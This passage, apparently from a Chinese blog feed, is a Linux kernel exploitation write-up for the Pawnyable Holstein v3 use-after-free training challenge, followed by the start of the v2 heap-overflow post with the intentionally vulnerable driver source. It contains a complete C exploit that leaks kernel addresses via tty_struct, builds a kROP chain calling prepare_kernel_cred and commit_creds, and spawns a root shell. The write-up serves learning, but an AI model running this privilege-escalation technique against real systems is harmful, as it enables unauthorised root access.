function">copy_from_user</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> size<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_26A<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_225<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>size需要小于0x400</p><h4 id="module-close"><a href="#module-close" class="headerlink" title="module_close"></a>module_close</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_1F8<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//UAF</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>未置空指针，存在UAF</p><h2 id="二-利用思路"><a href="#二-利用思路" class="headerlink" title="(二)利用思路"></a>(二)利用思路</h2><h3 id="UAF的利用"><a href="#UAF的利用" class="headerlink" title="UAF的利用"></a>UAF的利用</h3><p>跟上一节不同的是，read和write进行了长度限制，无法溢出（还扣掉了符号表）</p><p>我们来看看close的实现</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_1F8<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//UAF</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>g_buf的指针未得到更新，存在UAF。</p><p>但是有些读者可能会想，虽然有UAF，但是close后我也不能对该<code>fd</code>做例如read、write等任何事情。这当然是正确的，但让我们回想一下在内核空间中运行的程序的特征。</p><p>内核空间允许多个程序共享相同的资源，该模块允许open多个程序，如果我们这样使用它：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span> <span class="token string">"/dev/holstein"</span> <span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">int</span> fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span> <span class="token string">"/dev/holstein"</span> <span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> <span class="token string">"X1NRI"</span> <span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>第一个open分配了g_buf，下一个open又使g_buf被新缓冲区替代（<strong>原来的g_buf未释放，close掉的是新的g_buf</strong>）。虽然fd1不可使用，但是fd1与fd2共同指向该驱动，此时通过对fd2进行操作，我们仍然能够操纵g_buf指向的已释放空间。</p><blockquote><p>思考：如果在关闭时删除带有 NULL 的指针来防止像这样的简单漏洞，或者创建一种如果在打开时已分配 g_buf 则会失败的设计，避免了UAF是否就万事大吉了？。我们将在下一章中了解这是否真的足够保证安全。</p></blockquote><h3 id="堆喷射"><a href="#堆喷射" class="headerlink" title="堆喷射"></a>堆喷射</h3><p>经过调试，不需要spray其实就能够得到目标内存</p><h3 id="对tty结构体的破坏问题"><a href="#对tty结构体的破坏问题" class="headerlink" title="对tty结构体的破坏问题"></a>对tty结构体的破坏问题</h3><p>为了绕过SMEP和SMAP，我们需要构造kROP。与堆溢出相似的地方略去不谈。值得注意的是，现在使用的区域是与tty_struct重叠的。<strong>tty_operations有很多未引用的变量在tty_struct中，当我们触发时，由于破坏了其它结构可能会引起意想不到的的错误</strong>。因此我们想让ropchain在一个单独的区域。</p><ul><li>我们的对策是进行两次UAF，第一个UAF在tty_struct上写ropchain和布置函数表；第二个UAF改tty_struct.ops并触发。</li></ul><h2 id="三-EXP"><a href="#三-EXP" class="headerlink" title="(三)EXP"></a>(三)EXP</h2><p>放一张brant-ruan大佬的思路图：<br><img src="/EXP_FILE/f58c762a8b7f43dc678dc8273e56a845_MD5.jpeg"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff8114078a</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PUSH_RDX_POP_RSP_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff8114fbea</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVSQ_RET</span> <span class="token expression"><span class="token number">0xffffffff81638e9b</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_RET</span> <span class="token expression"><span class="token number">0xffffffff8150b6d6</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> prepare_kernel_cred<span class="token operator">=</span><span class="token number">0xffffffff81072560</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds<span class="token operator">=</span><span class="token number">0xffffffff810723c0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\0330xffffffff812f5003[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd1<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd2<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd1 <span class="token operator">||</span> fd2<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein Open Failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> tty_fd1<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//bss 0xffffffffc00023c0</span><span class="token keyword">if</span> <span class="token punctuation">(</span>tty_fd1<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] /dev/ptmx Opened\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x400</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> koff<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x18</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0xc39c60</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> heap<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x38</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x38</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] koff => 0x%lx\n"</span><span class="token punctuation">,</span>koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] ropchain => 0x%lx\n"</span><span class="token punctuation">,</span>heap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x40</span><span class="token punctuation">]</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVSQ_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span>koff<span class="token operator">+</span><span class="token number">22</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">]</span><span class="token operator">=</span>PUSH_RDX_POP_RSP_POP_RBP_RET<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd3<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd4<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd3 <span class="token operator">||</span> fd4<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein Open Failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>fd3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> tty_fd2<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//bss 0xffffffffc00023c0</span><span class="token keyword">if</span> <span class="token punctuation">(</span>tty_fd2<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] /dev/ptmx Opened\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x18</span><span class="token punctuation">]</span><span class="token operator">=</span>heap<span class="token operator">+</span><span class="token number">0x30</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">-</span><span class="token number">0xc</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token comment">//ops_ioctl</span><span class="token function">write</span><span class="token punctuation">(</span>fd4<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>tty_fd2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> heap<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/bcc4d57365d2610b8d822b2fc8cb29fe_MD5.jpeg"></p><blockquote><p>附件：<a href="https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.gz">LK01-3.tar.gz</a><br>参考文章：<a href="https://blog.wohin.me/posts/pawnyable-0203/">Linux Kernel PWN | 040203 Pawnyable之UAF (wohin.me)</a><br><a href="https://pawnyable-cafe.translate.goog/linux-kernel/LK01/use_after_free.html?_x_tr_sl=auto&_x_tr_tl=zh-CN&_x_tr_hl=zh-CN&_x_tr_pto=wapp">Holstein v3：释放后使用利用 | 可典当！ (pawnyable-cafe.translate.goog)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux Kernel Mode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pawnyable </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LK01-2 Holstein v2 堆溢出</title>
      <link href="/2024/02/03/LK01-2%20Holstein%20v2%20%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
      <url>/2024/02/03/LK01-2%20Holstein%20v2%20%E5%A0%86%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>LKM源码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/uaccess.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/slab.h></span></span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_AUTHOR</span><span class="token punctuation">(</span><span class="token string">"ptr-yudai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_DESCRIPTION</span><span class="token punctuation">(</span><span class="token string">"Holstein v2 - Vulnerable Kernel Driver for Pawnyable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEVICE_NAME</span> <span class="token string">"holstein"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">0x400</span></span></span><span class="token keyword">char</span> <span class="token operator">*</span>g_buf <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_open called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  g_buf <span class="token operator">=</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span>BUFFER_SIZE<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_buf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"kmalloc failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">module_read</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>                           <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span>                           <span class="token class-name">loff_t</span> <span class="token operator">*</span>f_pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_read called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> g_buf<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"copy_to_user failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">module_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>                            <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span>                            <span class="token class-name">loff_t</span> <span class="token operator">*</span>f_pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_write called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"copy_from_user failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_close called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> module_fops <span class="token operator">=</span>  <span class="token punctuation">&#123;</span>   <span class="token punctuation">.</span>owner   <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>   <span class="token punctuation">.</span>read    <span class="token operator">=</span> module_read<span class="token punctuation">,</span>   <span class="token 